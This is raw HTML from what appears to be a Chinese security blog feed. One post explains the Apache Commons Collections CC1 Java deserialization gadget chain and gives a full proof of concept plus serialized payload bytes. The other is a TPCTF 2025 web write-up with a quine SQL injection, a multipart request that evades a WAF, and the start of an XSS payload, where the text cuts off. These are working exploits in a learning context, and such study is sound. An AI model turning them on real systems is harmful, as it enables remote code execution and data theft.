&#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2.</strong> <code>InvokerTransformer</code>：<br>传入对象，函数名，参数<br>返回执行结果<br>所以此处如果传入<code>Runtime</code>对象、函数<code>exec</code>、参数<code>命令(演示用calc)</code><br>就可以实现命令执行：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iMethodName = methodName;</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">        <span class="comment">//...报错处理</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再用<code>ChainedTransformer</code>将这两个翻译器连起来<br>这个翻译器会把输入按顺序通过列表中的翻译器:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时只要执行一句:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">transformerChain.transform(<span class="string">&quot;a&quot;</span>);</span><br></pre></td></tr></table></figure><p>就可以实现命令执行弹出计算器了</p><h3 id="构造序列化数据"><a href="#构造序列化数据" class="headerlink" title="构造序列化数据"></a>构造序列化数据</h3><p>但只是我们本地测试的一个效果<br>想在服务器上反序列化的过程触发这个操作<br>还需要借助别的东西<br>想要直接执行上述的<code>transform</code>方法比较困难<br>将其转换为别的操作:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(</span><br><span class="line">    innerMap, </span><br><span class="line">    <span class="literal">null</span>,</span><br><span class="line">    transformerChain</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>看一下<code>TransformedMap</code>这个特殊的<code>Map</code>类:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;</span><br><span class="line">    key = transformKey(key);</span><br><span class="line">    value = transformValue(value);</span><br><span class="line">    <span class="keyword">return</span> getMap().put(key, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">transformValue</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (valueTransformer == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(object);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说这个类可以传入：</p><ul><li>一个<code>HashMap</code></li><li>一个键翻译器</li><li>一个值翻译器</li></ul><p>而后在添加(<code>put</code>)新的元素的时候<br>会先将键值对分别翻译后再添加<br>此时就触发了翻译操作<br>触发执行命令的语句从</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">transformerChain.transform(<span class="string">&quot;a&quot;</span>);</span><br></pre></td></tr></table></figure><p>转换为了</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">outerMap.put(<span class="string">&quot;键&quot;</span>, <span class="string">&quot;值&quot;</span>);</span><br></pre></td></tr></table></figure><p>那么如何在序列化的过程中实现这个添加元素的过程呢<br>需要进入下一步:</p><h4 id="AnnotationInvocationHandler类"><a href="#AnnotationInvocationHandler类" class="headerlink" title="AnnotationInvocationHandler类"></a><code>AnnotationInvocationHandler</code>类</h4><p>位于:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">sun.reflect.annotation.AnnotationInvocationHandler</span><br></pre></td></tr></table></figure><p>是 Java 标准库中的一个内部类（位于 sun.reflect.annotation 包），<br>主要用于处理注解（Annotation）的动态代理机制。<br>它在 Java 的反射和注解处理中扮演重要角色，<br>但由于是内部 API，开发者通常不会直接使用它。</p><ul><li>注解（不是注释）：<br>注解是 Java 中的一种元数据（Metadata）​机制，用于为代码（类、方法、字段等）添加额外的结构化信息。这些信息可以被编译器、开发工具或运行时框架（如 Spring、Hibernate）读取，并根据注解的内容执行特定操作。<br>相当于给编译器看的注释而非给人看的。</li></ul><p>看看他的<code>readObject</code>方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    var1.defaultReadObject();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var10 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var10.memberTypes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(Map.Entry var5 : <span class="built_in">this</span>.memberValues.entrySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">        <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var10.members().get(var6)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到使用一个for循环对<code>this.memberValues</code>属性进行了一系列的操作<br>这个属性就是我们的map，看看构造方法:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">    Class[] var3 = var1.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) &#123;</span><br><span class="line">        <span class="built_in">this</span>.type = var1;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = var2;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将我们的<code>outerMap</code>作为第二个参数传入赋值给<code>memberValues</code><br>触发添加元素:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)construct.newInstance(Retention.class, outerMap);</span><br></pre></td></tr></table></figure><p>将handler输出为序列化字符串<br>就是我们的payload:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">oos.writeObject(handler);</span><br><span class="line">oos.close();</span><br><span class="line">System.out.println(barr);</span><br></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">iTransformerst -[Lorg/apache/commons/collections/Transformer;xpur -[Lorg.apache.commons.collections.Transformer;�V*��4�  xp   sr ;org.apache.commons.collections.functors.ConstantTransformerXv�A�� L iConstantt Ljava/lang/Object;xpvr java.lang.Runtime           xpsr :org.apache.commons.collections.functors.InvokerTransformer���k&#123;|�8 [ iArgst [Ljava/lang/Object;L iMethodNamet Ljava/lang/String;[ iParamTypest [Ljava/lang/Class;xpur [Ljava.lang.Object;��X�s)l  xp   t </span><br><span class="line">getRuntimeur [Ljava.lang.Class;�׮��Z�  xp    t getMethoduq ~    vr java.lang.String��8z;�B  xpvq ~ sq ~ uq ~    puq ~     t invokeuq ~    vr java.lang.Object           xpvq ~ sq ~ ur [Ljava.lang.String;��V��&#123;G  xp   t calct execuq ~    q ~ sr java.util.HashMap���`� F </span><br><span class="line">loadFactorI thresholdxp?@           t valuet xxxxxxvr java.lang.annotation.Retention           xp</span><br></pre></td></tr></table></figure><p>假如存在某个这样的漏洞点:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(newByteArrayInputStream(barr.toByteArray()));</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br></pre></td></tr></table></figure><p>按理说就可以执行我们的恶意代码了<br>不过还存在最后一个问题<br>那就是<code>Runtime</code>类事实上没有实现<code>Serializable</code>接口<br>导致无法被序列化<br><strong>怎么办？</strong><br>在JVM中，每个类加载后都会生成一个唯一的<code>Class</code>对象，<br>用来表示该类的类型信息，获取方式：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">类名.class</span><br></pre></td></tr></table></figure><p>同样的，使用：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime.class</span><br></pre></td></tr></table></figure><p>就可以获取到Runtime的Class对象<br>这个对象可以进行反射调用获取Runtime并执行命令：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">f</span> <span class="operator">=</span> Runtime.class.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) f.invoke(<span class="literal">null</span>);</span><br><span class="line">r.exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure><p>那么我们就需要换一条翻译链子了：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">        ),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">        ),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;  <span class="comment">// 弹出计算器（Windows）</span></span><br><span class="line">        )</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>完整poc:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        String.class,</span><br><span class="line">                        Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        Object.class,</span><br><span class="line">                        Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span></span><br><span class="line">                        <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class</span><br><span class="line">                &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;</span><br><span class="line">                                <span class="string">&quot;calc&quot;</span> &#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>,</span><br><span class="line">                transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span></span><br><span class="line">                Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,</span><br><span class="line">                Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)</span><br><span class="line">                construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很长很绕，让自己来挖做不到<br>尤其是注解类，发现不了，审不明白<br>思路学一辈子</p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tpctf2025</title>
      <link href="/2025/03/12/2025tpctf/"/>
      <url>/2025/03/12/2025tpctf/</url>
      
        <content type="html"><![CDATA[<h1 id="tpctf-web复现"><a href="#tpctf-web复现" class="headerlink" title="tpctf web复现"></a>tpctf web复现</h1><h3 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>(<span class="params">request:HttpRequest</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method != <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;Welcome to TPCTF 2025&#x27;</span>)</span><br><span class="line">    username = request.POST.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> username != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;you are not admin.&#x27;</span>)</span><br><span class="line">    password = request.POST.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    users:AdminUser = AdminUser.objects.raw(<span class="string">&quot;SELECT * FROM blog_adminuser WHERE username=&#x27;%s&#x27; and password =&#x27;%s&#x27;&quot;</span> % (username,password))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">assert</span> password == users[<span class="number">0</span>].password</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(os.environ.get(<span class="string">&#x27;FLAG&#x27;</span>))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;wrong password&#x27;</span>)</span><br></pre></td></tr></table></figure><p>根据这个flag接口判断<br>输入的密码要与查询出来的密码相同<br>所以要么想办法获得真正的密码<br>要么输出和查询语句一样的语句<br>这种注入叫做<code>quine注入</code><br>从基础示例理解:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">replace(</span><br><span class="line">    <span class="string">&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;</span>,</span><br><span class="line">    <span class="type">char</span>(<span class="number">46</span>),</span><br><span class="line">    <span class="string">&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;</span>);</span><br></pre></td></tr></table></figure><p>但是实际payload要加很多东西来闭合<br>所以实际payload结构如下:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>, </span><br><span class="line">  REPLACE(</span><br><span class="line">    REPLACE(</span><br><span class="line">      <span class="string">&#x27;[Inner_String]&#x27;</span>, </span><br><span class="line">      <span class="type">CHAR</span>(<span class="number">34</span>), <span class="type">CHAR</span>(<span class="number">39</span>)</span><br><span class="line">    ), </span><br><span class="line">    <span class="type">CHAR</span>(<span class="number">36</span>), </span><br><span class="line">    <span class="string">&#x27;[Outer_String]&#x27;</span></span><br><span class="line">  ) <span class="operator">||</span> <span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>payload为</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT 1,2, </span></span><br><span class="line"><span class="string">    REPLACE(</span></span><br><span class="line"><span class="string">        REPLACE(&#x27;</span></span><br><span class="line">            &quot; UNION SELECT 1,2, REPLACE(REPLACE(&quot;$&quot;,CHAR(34),CHAR(39)),CHAR(36),&quot;$&quot;) || &quot;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ,CHAR(34),CHAR(39)</span></span><br><span class="line"><span class="string">            ),</span></span><br><span class="line"><span class="string">            CHAR(36),</span></span><br><span class="line"><span class="string">            &#x27;</span>&quot; UNION SELECT 1,2, REPLACE(REPLACE(&quot;$&quot;,CHAR(34),CHAR(39)),CHAR(36),&quot;$&quot;) || &quot;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    ) || &#x27;</span></span><br></pre></td></tr></table></figure><p>之后需要绕过go的一个waf<br>防的很严，需要用一个特性绕过<br>使其不解析<br><a href="https://blog.csdn.net/Thewei666/article/details/142408096">https://blog.csdn.net/Thewei666/article/details/142408096</a></p><p>数据流:</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/flag/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;121&quot;, &quot;Not A(Brand&quot;;v=&quot;99&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">If-None-Match</span><span class="punctuation">: </span>&quot;1564-5ee8764d17ec0&quot;</span><br><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Mon, 28 Nov 2022 12:56:03 </span><br><span class="line">Content-Type:multipart/form-data;boundary=----abcdefg</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>453</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------abcdefg--</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;username&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">admin</span></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------abcdefg--</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;password&quot;; filename=&quot;password&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;password&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="number">1</span><span class="string">&#x27; union select 1,2,replace(replace(&#x27;</span><span class="number">1</span>&quot; union select 1,2,replace(replace(&quot;#&quot;,char(34),char(39)),char(35),&quot;#&quot;)-- &#x27;,char(34),char(39)),char(35),&#x27;1&quot; <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,replace(replace(&quot;#&quot;,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>)),<span class="type">char</span>(<span class="number">35</span>),&quot;#&quot;)<span class="comment">-- &#x27;)-- </span></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------abcdefg--</span></span></span><br></pre></td></tr></table></figure><p>成功获得</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;testflag&#125;&quot;</span><br></pre></td></tr></table></figure><h3 id="baby-layout"><a href="#baby-layout" class="headerlink" title="baby-layout"></a>baby-layout</h3><p>本题利用<code>HTML属性注入</code>以及<code>事件驱动执行</code><br>payload:</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;&quot;layout&quot;:&quot;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;&#123;&#123;content&#125;&#125;&#x27;</span>&gt;</span>&quot;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;content&quot;</span>:<span class="string">&quot;x\&quot; onerror=\&quot;alert(1)&quot;</span>,<span class="string">&quot;layoutId&quot;</span>:<span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure><p>这样的话就成了:</p><figure class="highlight 